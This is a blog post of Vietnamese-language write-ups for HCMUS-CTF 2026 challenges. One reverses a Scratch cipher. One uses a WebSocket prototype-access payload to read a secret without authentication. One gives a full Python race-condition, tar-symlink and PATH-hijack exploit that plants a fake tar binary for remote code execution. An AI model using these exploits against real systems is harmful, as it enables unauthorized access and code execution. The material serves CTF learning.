---
title: HCMUS-CTF 2026 Qualification
date: 2026-06-15 09:00:00 +0700
categories: [Security, CTF]
tags: [writeup, reverse-engineering, web]
math: true
image:
  path: /assets/img/HCMUSCTF2026/logo.png
---

## **Reverse**

### **meowmeowmeow**

- Tác giả: huytrinhm
- Mô tả: 

My cat says "mewp nyaru nyau purru meowmew mrowi prrru rrupri mrowu mewu nyannya mewri miaumew nyai prrrr meowa mewa mrrri mrowri rrupri nyanya purrnya purra prri nyap purru nyanra meowri rrupra mrrp nyanu nyara mrrmew nyanra miauri miaui miauu mrrnya purra purri meowrr miaup miauru", what does it mean?

- Attachment: `meow.sb3`
- Cách giải: 

#### Phân tích file

File `.sb3` thực chất là một archive **ZIP**. Giải nén ra ta được:

```
meow.sb3
├── project.json         ← toàn bộ logic chương trình
├── 0fb9be3e...svg       ← sprite con mèo
└── f3616ab4...svg       ← sprite blank
```

File `project.json` là định dạng project **Scratch 3.0**, chứa các *block* dưới dạng JSON. Ta sẽ đọc và phân tích file này thay vì chạy trực tiếp trên Scratch.

---

#### Phân tích logic

##### Bước 1 — Đọc toàn bộ khối lệnh

Parse `project.json`, tìm sprite `main` chứa logic chính. Khi click cờ xanh (flag clicked), chương trình:

1. Hỏi người dùng nhập chuỗi (`ask "meow?"`)
2. Lưu input vào biến `raw`
3. Lặp qua từng ký tự (index `i` từ 1 đến `len(raw)`):
   - `pos = i`
   - `ch = raw[i]`
   - **Switch costume** sang ký tự đó → đọc `costume_number - 1` → lưu vào `v`
   - Chạy lần lượt **128 gate** từ `gate_000` đến `gate_127`
   - Ánh xạ giá trị `v` cuối cùng sang một **từ tiếng mèo**
   - Nối vào chuỗi `out`
4. Broadcast `done` → hiển thị `out`

> **Nhận xét:** Sprite được đặt tên là các ký tự ASCII từ space (` `) đến `~`, nên `costume_number - 1` chính là `ord(ch) - 32`.

---

##### Bước 2 — Cấu trúc gate

Mỗi `gate_XXX` là một custom block (procedure) thực hiện biến đổi tuyến tính lên `v`:

```
v = (a * v  +  b * pos  +  c)  mod  95
```

với `a`, `b`, `c` là hằng số riêng cho mỗi gate. Ví dụ:

| Gate     | a   | b   | c   |
| -------- | --- | --- | --- |
| gate_000 | 31  | 2   | 15  |
| gate_001 | 33  | 38  | 60  |
| gate_058 | 23  | 36  | 31  |
| gate_127 | 71  | 40  | 0   |

Có tất cả **128 gate** được áp dụng tuần tự cho mỗi ký tự.

---

##### Bước 3 — Bảng mã tiếng mèo

Sau khi qua 128 gate, `v ∈ [0, 94]` được dịch sang từ mèo:

| v   | Từ mèo  | v   | Từ mèo |
| --- | ------- | --- | ------ |
| 0   | meowa   | 45  | nyaru  |
| 1   | meowi   | 62  | purru  |
| 7   | meowmew | 81  | mrowi  |
| 94  | rrupri  | …   | …      |

Toàn bảng có 95 từ, tương ứng với 95 ký tự ASCII in được (từ space `0x20` đến `~` `0x7E`).

---

##### Bước 4 — Điều kiện kiểm tra (audit_lane)

48 procedure `audit_lane_XX` tính một **checksum** dựa trên toàn bộ input. Tuy nhiên đây chỉ là phần kiểm tra *sau* khi mã hóa, không ảnh hưởng đến việc giải mã ngược.

---

#### Giải mã (Reverse)

Ta cần đảo ngược quá trình: từ từ mèo → ký tự gốc.

##### Bước 1 — Đọc ciphertext

```
mewp nyaru nyau purru meowmew mrowi prrru rrupri mrowu mewu nyannya mewri
miaumew nyai prrrr meowa mewa mrrri mrowri rrupri nyanya purrnya purra prri
nyap purru nyanra meowri rrupra mrrp nyanu nyara mrrmew nyanra miauri miaui
miauu mrrnya purra purri meowrr miaup miauru
```

→ 43 từ → flag dài **43 ký tự**.

##### Bước 2 — Ánh xạ ngược từ mèo → v

```python
word_to_v = { 'meowa':0, 'meowi':1, ..., 'rrupri':94 }
v = word_to_v[word]
```

##### Bước 3 — Đảo ngược 128 gate

Mỗi gate có dạng `v_new = (a * v_old + b*pos + c) % 95`.

Vì `gcd(a, 95) = 1` với **tất cả** 128 gate, modular inverse của `a` luôn tồn tại. Ta đảo ngược từ gate_127 về gate_000:

```python
# v_new = (a * v_old + b*pos + c) % 95
# => v_old = inv(a) * (v_new - b*pos - c) % 95

inv_a = pow(a, -1, 95)   # Python 3.8+
v = (inv_a * (v - b * pos - c)) % 95
```

##### Bước 4 — Khôi phục ký tự

```python
char = chr(v + 32)
```

---

#### Script Exploit

```python
import math

# 128 gate params (a, b, c) extracted from project.json
gates = [
    (31,2,15),(33,38,60),(58,82,20),(73,81,55),(17,44,14),(43,54,8),(34,48,70),(32,22,92),
    (51,3,8),(41,51,85),(18,35,43),(8,81,8),(58,26,77),(23,41,15),(21,33,26),(68,59,88),
    (56,83,56),(67,59,64),(28,34,41),(83,14,5),(73,54,71),(79,66,15),(43,86,6),(24,52,21),
    (43,48,48),(42,4,14),(62,31,50),(93,86,48),(82,14,81),(72,3,55),(8,65,65),(43,8,29),
    (64,75,45),(29,82,20),(59,81,28),(3,68,13),(23,4,11),(67,38,1),(12,55,76),(78,40,40),
    (21,5,75),(59,64,51),(26,20,13),(53,58,31),(52,28,43),(22,21,14),(53,90,61),(18,11,43),
    (2,17,78),(67,19,40),(23,8,16),(87,88,62),(72,79,42),(36,31,71),(43,32,25),(89,38,81),
    (29,49,26),(33,19,43),(23,36,31),(2,5,49),(23,71,88),(14,31,81),(69,2,64),(9,1,74),
    (43,10,84),(51,68,50),(2,50,60),(12,71,6),(42,45,92),(52,18,9),(13,7,51),(63,85,74),
    (26,4,12),(61,36,79),(36,25,72),(42,51,20),(24,25,20),(72,57,37),(68,0,24),(3,85,31),
    (43,35,29),(12,77,90),(59,11,56),(39,5,23),(16,62,24),(89,11,37),(17,31,82),(78,16,6),
    (94,26,26),(46,90,15),(83,60,82),(44,37,1),(23,69,22),(27,22,2),(62,86,0),(12,59,82),
    (54,33,56),(27,33,52),(27,21,10),(53,45,13),(37,42,78),(82,94,43),(12,25,19),(74,94,72),
    (39,30,72),(46,25,35),(66,86,29),(88,86,19),(89,91,10),(84,49,86),(59,90,0),(56,90,45),
    (7,22,80),(46,48,87),(11,33,21),(51,85,0),(48,68,59),(87,7,66),(52,38,36),(68,5,50),
    (58,55,93),(56,58,1),(72,6,46),(66,38,21),(67,18,37),(73,33,42),(39,57,66),(71,40,0),
]

word_to_v = {
    'meowa':0,'meowi':1,'meowu':2,'meowra':3,'meowri':4,'meowru':5,'meownya':6,'meowmew':7,
    'meowp':8,'meowrr':9,'mewa':10,'mewi':11,'mewu':12,'mewra':13,'mewri':14,'mewru':15,
    'mewnya':16,'mewmew':17,'mewp':18,'mewrr':19,'mrra':20,'mrri':21,'mrru':22,'mrrra':23,
    'mrrri':24,'mrrru':25,'mrrnya':26,'mrrmew':27,'mrrp':28,'mrrrr':29,'prra':30,'prri':31,
    'prru':32,'prrra':33,'prrri':34,'prrru':35,'prrnya':36,'prrmew':37,'prrp':38,'prrrr':39,
    'nyaa':40,'nyai':41,'nyau':42,'nyara':43,'nyari':44,'nyaru':45,'nyanya':46,'nyamew':47,
    'nyap':48,'nyarr':49,'nyana':50,'nyani':51,'nyanu':52,'nyanra':53,'nyanri':54,'nyanru':55,
    'nyannya':56,'nyanmew':57,'nyanp':58,'nyanrr':59,'purra':60,'purri':61,'purru':62,
    'purrra':63,'purrri':64,'purrru':65,'purrnya':66,'purrmew':67,'purrp':68,'purrrr':69,
    'miaua':70,'miaui':71,'miauu':72,'miaura':73,'miauri':74,'miauru':75,'miaunya':76,
    'miaumew':77,'miaup':78,'miaurr':79,'mrowa':80,'mrowi':81,'mrowu':82,'mrowra':83,
    'mrowri':84,'mrowru':85,'mrownya':86,'mrowmew':87,'mrowp':88,'mrowrr':89,'rrupa':90,
    'rrupi':91,'rrupu':92,'rrupra':93,'rrupri':94,
}

cipher = ("mewp nyaru nyau purru meowmew mrowi prrru rrupri mrowu mewu nyannya mewri "
          "miaumew nyai prrrr meowa mewa mrrri mrowri rrupri nyanya purrnya purra prri "
          "nyap purru nyanra meowri rrupra mrrp nyanu nyara mrrmew nyanra miauri miaui "
          "miauu mrrnya purra purri meowrr miaup miauru")

flag = ""
for pos_idx, word in enumerate(cipher.split()):
    pos = pos_idx + 1
    v = word_to_v[word]
    for i in range(127, -1, -1):
        a, b, c = gates[i]
        v = (pow(a, -1, 95) * (v - b * pos - c)) % 95
    flag += chr(v + 32)

print(flag)
```

> Flag: `HCMUS-CTF{dear_human_gimme_more_f~ish~lags}`
{: .prompt-flag }

## **Web**

### **Pink Black Vault Heist**

- Tác giả: haruna38
- Mô tả: 

The Pink Black Bank is the city's most discreet private institution - a 24-karat fortress whose clients prefer their balances stay off-ledger. At its heart sits the Pink Black Vault: a single sealed chamber, opened only by the bank's chief operator, holding fortunes no outsider has ever glimpsed.

Last week, an inside job leaked fragments of the vault's inner workings. Not the whole picture. Enough.

Read what fell into your hands. Find the way in. Walk out a billionaire - maybe a trillionaire.

- Attachment: `Pink_Black_Vault_Heist-dist.zip`
- Cách giải:

#### TL;DR
Bài tập cung cấp source code của một hệ thống két sắt bảo mật sử dụng giao thức RPC qua WebSocket. Tác giả đã giăng một cái bẫy (rabbit hole) rất khéo léo bằng một JWT Secret siêu yếu để dụ người chơi brute-force. Tuy nhiên, lỗ hổng thực sự nằm ở cơ chế phân giải đường dẫn của Custom RPC, cho phép kẻ tấn công truy cập vào `prototype` của class và gọi trực tiếp hàm chứa Flag mà không cần bất kỳ quyền xác thực nào.

#### Bước 1: Trinh sát và Đọc Source Code

Khi nhận được source code, mình bắt đầu kiểm tra file `config.js` và phát hiện ra nơi chứa cờ:

```javascript
// config.js
export const VAULT_KEY = process.env.FLAG || "HCMUS-CTF{fakeflag}";
```

Mục tiêu của chúng ta là bằng cách nào đó đọc được biến `VAULT_KEY` này.
Tiếp tục kiểm tra file `vault.js`, có một hàm tên là `getVaultSecret()` trả về trực tiếp giá trị này:

```javascript
// vault.js
export class UserApi {
  // ...
  getVaultSecret() {
    return VAULT_KEY;
  }
}
```

Tuy nhiên, hàm này không được public trực tiếp qua các API thông thường. Để lấy được nó, chúng ta phải đi qua giao diện người dùng (mở két sắt).

#### Bước 2: Rơi vào Rabbit Hole (Cái Bẫy)

Kiểm tra thuật toán mã hóa trong `config.js` và `crypto-helpers.js`, đập vào mắt mình là một điểm yếu "chết người":

```javascript
// config.js
// TODO: persist via secret manager so tokens survive restarts
export const JWT_SECRET = crypto.randomBytes(5);
```

Secret của JWT chỉ dài vỏn vẹn **5 bytes**. Với độ dài này, bạn hoàn toàn có thể dùng Hashcat (mode 16500) để brute-force offline và crack được chữ ký JWT trong vài phút. 

Từ đó, suy nghĩ tự nhiên nhất là: *Crack JWT -> Tạo token giả với `isAdmin: true` -> Gọi API mở két*.

**NHƯNG ĐÂY LÀ MỘT CÁI BẪY!**

Hãy nhìn kỹ vào hàm mở két trong `vault.js`:

```javascript
  openVault(key) {
    if (!this.session?.isAdmin) throw new Error("admin access required");
    const success = key == this.getVaultSecret(); // Cần phải biết trước key!
    
    if (success) {
      return { success: true, message: "Vault cracked!..." };
    }
    return { success: false, message: "wrong key" };
  }
```

Ngay cả khi bạn có được quyền `isAdmin`, bạn **VẪN PHẢI BIẾT TRƯỚC KEY (FLAG)** để truyền vào biến `key`. Nếu truyền sai, server chỉ trả về `"wrong key"` chứ không hề in flag ra cho bạn. Việc tốn thời gian crack JWT hoàn toàn trở nên vô nghĩa.

---

#### Bước 3: Tìm kiếm Lỗ hổng Thực sự (Prototype Property Access)

Quay lại xem xét cách giao tiếp giữa Frontend và Backend, ứng dụng sử dụng một cơ chế RPC tùy chỉnh thông qua WebSocket.

Phân tích các gói tin WebSocket trong tab `Network > Messages`, cấu trúc giao tiếp trông như sau:
*   **Gửi (Push):** `["push", ["pipeline", 0, ["auth", "login"], ["user", "pass"]]]`
*   **Lấy kết quả (Pull):** `["pull", 5]`
*   **Nhận lại (Resolve):** `["resolve", 5, {...}]`

Để ý tham số đường dẫn: `["auth", "login"]` gọi hàm `login` của `AuthApi`. Hoặc `["user", "openVaults"]` gọi hàm `openVaults` của `UserApi`.

Lúc này, mình nhìn lại hàm `getVaultSecret()` trong `UserApi`:
```javascript
  getVaultSecret() {
    return VAULT_KEY;
  }
```
*Điểm chí mạng:* Hàm này **KHÔNG** sử dụng con trỏ `this`. Nó chỉ đơn thuần return một hằng số.

Trong JavaScript, các method của một class thực chất được lưu bên trong thuộc tính **`prototype`** của class đó. Nếu cơ chế router của RPC không lọc (sanitize) các input truyền vào, chúng ta có thể truyền thẳng một mảng đường dẫn lợi dụng `prototype` để gọi trực tiếp các method nội bộ.

Thay vì gọi: `["user", "openVaults"]`
Chúng ta có thể gọi: `["user", "prototype", "getVaultSecret"]`

Vì hàm này không dùng `this`, nó sẽ không bị lỗi khi được gọi dưới dạng *unbound method*, và quan trọng nhất: **Không cần token xác thực!**

---

#### Bước 4: Khai thác và Lấy Cờ (Exploitation)

Biết được payload và cấu trúc WebSocket, chúng ta có thể mở trực tiếp F12 -> tab **Console** trên trang của bài thi và chạy script sau để lấy cờ:

```javascript
// Khởi tạo kết nối WebSocket đến server RPC
const ws = new WebSocket("ws://chall.blackpinker.com:20353/rpc");

ws.onopen = () => {
    console.log("[+] Connected! Sending Prototype Exploitation Payload...");
    
    // 1. Gửi lệnh khai thác: đi sâu vào prototype để gọi getVaultSecret
    ws.send(JSON.stringify([
        "push", 
        ["pipeline", 0, ["user", "prototype", "getVaultSecret"], []]
    ]));
    
    // 2. Yêu cầu server trả về kết quả (id = 1 vì đây là request đầu tiên trên kết nối mới)
    ws.send(JSON.stringify(["pull", 1]));
};

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    
    // Đọc kết quả từ gói tin "resolve"
    if (data[0] === "resolve") {
        console.log("%cFLAG: " + data[2], "color: #66ffaa; font-size: 20px; font-weight: bold;");
    }
};
```

> Flag: `HCMUS-CTF{wh4t_4_5cr4ppy_v4ult_pr0t0typ3!!}`
{: .prompt-flag }

### **TARget**

- Tác giả: Dat2Phit
- Mô tả: 

I gib you 1 endpoint, you gib me flag.

- Attachment: `TARget-dist.zip`
- Cách giải:

#### 1. Phân tích mã nguồn

Đề bài cung cấp một ứng dụng Flask cho phép người dùng upload một file `.tar` để giải nén. Dưới đây là các đoạn code đáng chú ý trong `app.py`:

```python
app.config['MAX_CONTENT_LENGTH'] = 1024  # Limit upload size to 1KB
```
Ứng dụng giới hạn cực kỳ khắt khe: Toàn bộ HTTP Request (bao gồm cả file) không được vượt quá 1024 bytes (1KB).

```python
if file and (file.filename.endswith('.tar')):
    UPLOAD_FOLDER = os.path.join(os.getcwd(), 'uploads', str(int(time.time())))
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    # ... lưu file ...
    subprocess.check_output(['tar', '-xf', tar_path, '-C', UPLOAD_FOLDER])
    # ... 
    shutil.rmtree(UPLOAD_FOLDER, ignore_errors=True)
```
Lỗ hổng nằm ở đây:
1. **Race Condition:** Tên thư mục `UPLOAD_FOLDER` được tạo dựa trên `int(time.time())` (tính theo giây). Nếu ta gửi nhiều request upload **trong cùng một giây**, chúng sẽ dùng chung một thư mục.
2. **Lỗ hổng "Tar Slip" (Symlink):** Công cụ `tar` mặc định hỗ trợ giải nén cả Symbolic Link. Nếu Request 1 giải nén ra một file symlink trỏ đến thư mục gốc `/`, và Request 2 (do Race Condition) tiếp tục giải nén vào chính symlink đó, thì các file của Request 2 sẽ bị ghi đè ra ngoài hệ thống (Directory Traversal).
3. **Thực thi mã lệnh (RCE - PATH Hijacking):** Lệnh `subprocess.check_output(['tar', ...])` không sử dụng đường dẫn tuyệt đối (vd: `/bin/tar`). Trong Docker image của Python, biến môi trường `$PATH` thường ưu tiên thư mục `/usr/local/bin` trước `/bin`. Do đó, nếu ta ghi đè/tạo một file có tên là `tar` tại `/usr/local/bin/tar`, hệ thống sẽ ưu tiên chạy file của ta thay vì công cụ `tar` gốc.

Ngoài ra, file `Dockerfile` cho thấy cờ (flag) bị đổi tên random bằng UUID:
```dockerfile
RUN mv /flag /flag-`cat /proc/sys/kernel/random/uuid`.txt
```
Ta không thể đoán tên file, mà bắt buộc phải chạy mã độc (RCE) để tự động đọc file `/flag-*.txt`.

#### 2. Chuỗi khai thác (Exploit Chain)

Để qua mặt giới hạn 1KB, thay vì gửi file `.tar` thuần túy, ta sẽ nén nó dưới dạng `GZIP`. Công cụ GNU `tar` trên Linux có khả năng tự động nhận diện và giải nén file `.tar.gz` ngay cả khi đuôi file là `.tar`.

**Kịch bản tấn công:**
1. **Payload 1:** Tạo một file nén chứa symlink `s -> /usr/local/bin`.
2. **Payload 2:** Tạo một file nén chứa mã độc Python đặt tên là `s/tar` (nhờ symlink của Payload 1, file này sẽ bị ghi đè thành `/usr/local/bin/tar`).
3. **Race Condition:** Gửi bão (spam) Payload 1 và Payload 2 cùng lúc bằng Multithreading. Nếu thành công, mã độc của ta sẽ được đặt vào `/usr/local/bin/tar` với quyền thực thi (`0o777`).
4. **Trigger (Kích hoạt):** Gửi một file `.tar` rác bất kỳ. Ứng dụng sẽ gọi `subprocess.check_output(['tar', ...])` và kích hoạt ngay tệp `/usr/local/bin/tar` (chính là mã độc của ta).
5. **Đọc Flag:** Mã độc sẽ dùng `glob` tìm file `/flag*.txt`, đọc nội dung và ghi vào một thư mục có thể truy cập được từ bên ngoài (như `/app/static/flag.txt`). Cuối cùng ta gọi `GET /static/flag.txt` để thu cờ.

#### 3. Exploit Script

Để đạt được dung lượng siêu nhỏ (<1KB), ta tối giản tên file, tên thư mục, viết mã độc trên 1 dòng và nén bằng GZIP:

```python
import requests
import threading
import tarfile
import io
import gzip
import time

TARGET_URL = "http://localhost:5000"

def build_payload1():
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode='w') as tar:
        ti = tarfile.TarInfo('s')
        ti.type = tarfile.SYMTYPE
        ti.linkname = '/usr/local/bin'
        tar.addfile(ti)
        for i in range(20):
            ti = tarfile.TarInfo(f'd1/{i}')
            ti.type = tarfile.DIRTYPE
            tar.addfile(ti)
    return gzip.compress(out.getvalue())

def build_payload2():
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode='w') as tar:
        # Mã độc: Tạo thư mục static, quét tìm file flag ở root và ghi đè ra thư mục tĩnh
        fake_tar = b"""#!/usr/local/bin/python
import os,glob;os.makedirs("/app/static",exist_ok=True);open("/app/static/flag.txt","w").write(open(glob.glob("/flag*")[0]).read())
print("OK")
"""
        ti = tarfile.TarInfo('s/tar')
        ti.size = len(fake_tar)
        ti.mode = 0o777 
        tar.addfile(ti, io.BytesIO(fake_tar))
        
        for i in range(20):
            ti = tarfile.TarInfo(f'd2/{i}')
            ti.type = tarfile.DIRTYPE
            tar.addfile(ti)
    return gzip.compress(out.getvalue())

def build_dummy():
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode='w') as tar:
        ti = tarfile.TarInfo('dummy')
        ti.type = tarfile.DIRTYPE
        tar.addfile(ti)
    return gzip.compress(out.getvalue())

p1, p2, dummy = build_payload1(), build_payload2(), build_dummy()

print(f"[*] Payload 1: {len(p1)} bytes | Payload 2: {len(p2)} bytes (Bypass 1KB thành công!)")

def send_req(payload):
    try: requests.post(f"{TARGET_URL}/untar", files={'file': ('a.tar', payload)})
    except: pass

print("[*] Gửi bão Request tạo Race Condition...")
for _ in range(5):
    threads = []
    for _ in range(10):
        threads.extend([threading.Thread(target=send_req, args=(p1,)), threading.Thread(target=send_req, args=(p2,))])
        threads[-2].start()
        threads[-1].start()
    for t in threads: t.join()

print("[*] Race Condition hoàn tất! Kích hoạt RCE...")
requests.post(f"{TARGET_URL}/untar", files={'file': ('dummy.tar', dummy)})
time.sleep(1)

print("[*] Đang đọc file chứa Cờ...")
r = requests.get(f"{TARGET_URL}/static/flag.txt")
print(f"\n[+] FLAG: {r.text}" if r.status_code == 200 else "[-] Thất bại, hãy chạy lại script.")
```

> Flag: `HCMUS-CTF{D1d_y0u_kn0w_th4t_unZ1p_4ls0_h4v3_th1s_1ssu3_but_w0rs3?}`
{: .prompt-flag }
